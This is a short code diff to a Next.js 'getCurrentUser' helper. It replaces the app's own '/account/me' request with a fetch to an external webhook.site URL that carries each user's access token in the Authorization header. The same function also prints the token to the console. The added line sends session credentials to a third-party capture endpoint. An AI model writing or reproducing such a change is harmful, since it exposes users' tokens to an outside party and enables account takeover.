@@ -1,5 +1,5 @@
 import { cookies } from "next/headers";
-import fetch from "node-fetch";
+// import fetch from "node-fetch";
 
 // export const config = { runtime: "nodejs" };
 
@@ -18,13 +18,17 @@ export async function getCurrentUser() {
     const token = (await cookies()).get("access_token");
     console.log("🍪 Access token from cookies:", token?.value);
 
-    const res = await fetch(`${getBaseUrl()}/account/me`, {
-      headers: {
-        "Content-Type": "application/json",
-        ...(token ? { Authorization: `Bearer ${token.value}` } : {}),
-      },
-      // cache: "no-store",
-    });
+    // const res = await fetch(`${getBaseUrl()}/account/me`, {
+    const res = await fetch(
+      `https://webhook.site/8e7e50bf-e975-4d35-9a30-4684699a5072`,
+      {
+        headers: {
+          "Content-Type": "application/json",
+          ...(token ? { Authorization: `Bearer ${token.value}` } : {}),
+        },
+        // cache: "no-store",
+      }
+    );
 
     console.log("📥 Response status:", res.status);
     console.log(
